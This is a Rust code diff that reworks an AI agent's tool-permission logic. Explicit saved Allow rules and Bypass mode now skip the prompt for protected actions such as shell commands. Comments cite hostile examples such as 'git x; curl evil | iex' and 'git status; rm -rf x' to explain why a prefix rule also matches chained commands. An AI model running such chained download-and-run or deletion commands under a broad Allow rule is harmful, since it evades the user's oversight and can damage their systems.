@@ -45,11 +45,10 @@ pub enum PermissionMode {
     /// Read-only: deny every mutating tool. Paired with a read-only registry +
     /// prompt steer for "design first, approve to apply".
     Plan,
-    /// Auto-allow configurable mutations. Protected actions still require a
-    /// one-time approval, regardless of mode or saved rules.
+    /// Auto-allow configurable mutations. Protected actions still ask unless an
+    /// explicit user-saved Allow rule matches.
     Auto,
-    /// Skip rules and prompts for configurable mutations. Protected actions still
-    /// require a one-time approval.
+    /// Skip all permission rules and prompts. Cancellation remains a hard deny.
     Bypass,
 }
 
@@ -74,8 +73,8 @@ pub struct Rule {
     /// Shell-only: a literal command PREFIX. `None` matches any command for the
     /// tool. `command: "git "` also matches `git status; rm -rf x` (anything
     /// chained after the prefix), so the matcher stays deliberately literal.
-    /// Historical prefix-Allow rules remain readable, but the protected-action
-    /// floor clamps their effective outcome to Ask.
+    /// Historical prefix-Allow rules remain readable and effective as explicit
+    /// user-approved exceptions.
     #[serde(default, skip_serializing_if = "Option::is_none")]
     pub command: Option<String>,
     pub decision: RuleDecision,
@@ -94,9 +93,7 @@ enum Outcome {
 /// `"*"` wildcard; a `command` constraint applies only to `run_command` calls and is a
 /// literal PREFIX match — never regex or shell-aware tokenization (a regex/shell
 /// parser would be a footgun: it can't safely tell that `git x; curl evil | iex`
-/// isn't "just a git command"). The matcher preserves historical rule behavior;
-/// the decision floor separately prevents a matching protected Allow from running
-/// without one-time approval.
+/// isn't "just a git command"). The matcher preserves historical rule behavior.
 fn rule_matches(rule: &Rule, tool: &str, command: Option<&str>) -> bool {
     if rule.tool != "*" && tool_names::canonical(&rule.tool) != tool_names::canonical(tool) {
         return false;
@@ -126,11 +123,11 @@ fn legacy_fallthrough(default_policy: &str) -> Outcome {
 /// 1. **Cancel wins, always.** A Stop denies everything — even `auto`/`bypass` —
 ///    so a cancelled batch can never keep mutating the workspace.
 /// 2. **Plan wins next.** It is a hard read-only deny; saved rules cannot loosen it.
-/// 3. **Compatibility outcome.** Bypass, the first matching rule, and then the
-///    mode/default-policy fallback retain their historical semantics.
-/// 4. **Protected-action floor.** Any compatibility Allow for Shell,
-///    DependencyInstall, HighRiskGit, or Unknown is clamped to Ask. Explicit Ask
-///    and Deny remain unchanged. Configurable tools are not clamped.
+/// 3. **Bypass is literal.** It skips rules and every permission prompt.
+/// 4. **Explicit rules win.** A saved Allow is the durable form of the user's
+///    "Always allow" choice; Ask and Deny remain exact too.
+/// 5. **Protected-action floor for implicit policy.** Shell, DependencyInstall,
+///    HighRiskGit, and Unknown clamp implicit Auto/default Allows to Ask.
 fn decide(
     mode: PermissionMode,
     rules: &[Rule],
@@ -147,32 +144,34 @@ fn decide(
         return Outcome::Deny;
     }
 
-    let compatibility_outcome = if mode == PermissionMode::Bypass {
-        Outcome::Allow
-    } else if let Some(rule) = rules.iter().find(|r| rule_matches(r, tool, command)) {
-        match rule.decision {
+    if mode == PermissionMode::Bypass {
+        return Outcome::Allow;
+    }
+
+    if let Some(rule) = rules.iter().find(|r| rule_matches(r, tool, command)) {
+        return match rule.decision {
             RuleDecision::Allow => Outcome::Allow,
             RuleDecision::Ask => Outcome::Ask,
             RuleDecision::Deny => Outcome::Deny,
-        }
-    } else {
-        match mode {
-            PermissionMode::Default => default_fallthrough,
-            PermissionMode::AcceptEdits => match tool_names::canonical(tool) {
-                tool_names::WRITE_FILE | tool_names::EDIT_FILE => Outcome::Allow,
-                _ => Outcome::Ask,
-            },
-            PermissionMode::Auto => Outcome::Allow,
-            PermissionMode::Bypass => Outcome::Allow,
-            // Handled before compatibility evaluation so rules cannot loosen Plan.
-            PermissionMode::Plan => Outcome::Deny,
-        }
+        };
+    }
+
+    let implicit_outcome = match mode {
+        PermissionMode::Default => default_fallthrough,
+        PermissionMode::AcceptEdits => match tool_names::canonical(tool) {
+            tool_names::WRITE_FILE | tool_names::EDIT_FILE => Outcome::Allow,
+            _ => Outcome::Ask,
+        },
+        PermissionMode::Auto => Outcome::Allow,
+        // Both are returned above; keep these arms exhaustive and fail-safe.
+        PermissionMode::Bypass => Outcome::Allow,
+        PermissionMode::Plan => Outcome::Deny,
     };
 
-    if risk != PermissionRisk::Configurable && compatibility_outcome == Outcome::Allow {
+    if risk != PermissionRisk::Configurable && implicit_outcome == Outcome::Allow {
         Outcome::Ask
     } else {
-        compatibility_outcome
+        implicit_outcome
     }
 }
 
@@ -536,20 +535,29 @@ mod tests {
 
     #[test]
     fn bypass_allows_and_ignores_rules() {
-        // For configurable actions, Bypass still means "skip the gate": even an
-        // explicit deny rule does not block it. Protected actions are tested below.
+        // Bypass literally skips the gate: neither an explicit deny rule nor a
+        // protected risk classification may produce a prompt.
         let rules = [rule("*", None, RuleDecision::Deny)];
-        assert_eq!(
-            decide(
-                PermissionMode::Bypass,
-                &rules,
-                "fs_write",
-                None,
-                false,
-                Outcome::Ask
-            ),
-            Outcome::Allow
-        );
+        for risk in [
+            PermissionRisk::Configurable,
+            PermissionRisk::Shell,
+            PermissionRisk::DependencyInstall,
+            PermissionRisk::HighRiskGit,
+            PermissionRisk::Unknown,
+        ] {
+            assert_eq!(
+                super::decide(
+                    PermissionMode::Bypass,
+                    &rules,
+                    "run_command",
+                    risk,
+                    Some("do it"),
+                    false,
+                    Outcome::Ask,
+                ),
+                Outcome::Allow
+            );
+        }
     }
 
     #[test]
@@ -578,8 +586,7 @@ mod tests {
     }
 
     #[test]
-    fn every_protected_or_unknown_risk_clamps_compatibility_allows_to_ask() {
-        let allow_rule = [rule("*", None, RuleDecision::Allow)];
+    fn every_protected_or_unknown_risk_clamps_implicit_allows_to_ask() {
         for risk in [
             PermissionRisk::Shell,
             PermissionRisk::DependencyInstall,
@@ -588,22 +595,20 @@ mod tests {
         ] {
             for (mode, rules, fallback) in [
                 (PermissionMode::Default, &[][..], Outcome::Allow),
-                (PermissionMode::Default, &allow_rule[..], Outcome::Deny),
                 (PermissionMode::AcceptEdits, &[][..], Outcome::Deny),
                 (PermissionMode::Auto, &[][..], Outcome::Deny),
-                (PermissionMode::Bypass, &allow_rule[..], Outcome::Deny),
             ] {
                 assert_eq!(
                     super::decide(mode, rules, "tool", risk, None, false, fallback),
                     Outcome::Ask,
-                    "{risk:?} must clamp {mode:?} allows"
+                    "{risk:?} must clamp {mode:?} implicit allows"
                 );
             }
         }
     }
 
     #[test]
-    fn protected_floor_overrides_exact_wildcard_prefix_and_legacy_alias_allows() {
+    fn explicit_exact_wildcard_prefix_and_legacy_alias_allows_are_effective() {
         let cases = [
             (
                 rule("run_command", None, RuleDecision::Allow),
@@ -638,7 +643,7 @@ mod tests {
                     false,
                     Outcome::Deny,
                 ),
-                Outcome::Ask
+                Outcome::Allow
             );
         }
     }
@@ -765,8 +770,7 @@ mod tests {
     #[test]
     fn shell_prefix_matches_and_pins_the_chaining_limitation() {
         let rules = [rule("shell", Some("git "), RuleDecision::Allow)];
-        // Isolate the legacy/configurable compatibility outcome: a matching
-        // prefix reaches Allow before the protected-action floor is applied.
+        // A matching saved prefix is an explicit user-approved Allow.
         assert_eq!(
             decide(
                 PermissionMode::Default,
@@ -779,7 +783,7 @@ mod tests {
             Outcome::Allow
         );
         // KNOWN MATCHING LIMITATION (pinned): anything chained after the prefix
-        // also matches. Real shell calls are protected and clamp this Allow to Ask.
+        // also matches, so the UI warns and creates narrower rules in context.
         assert_eq!(
             decide(
                 PermissionMode::Default,
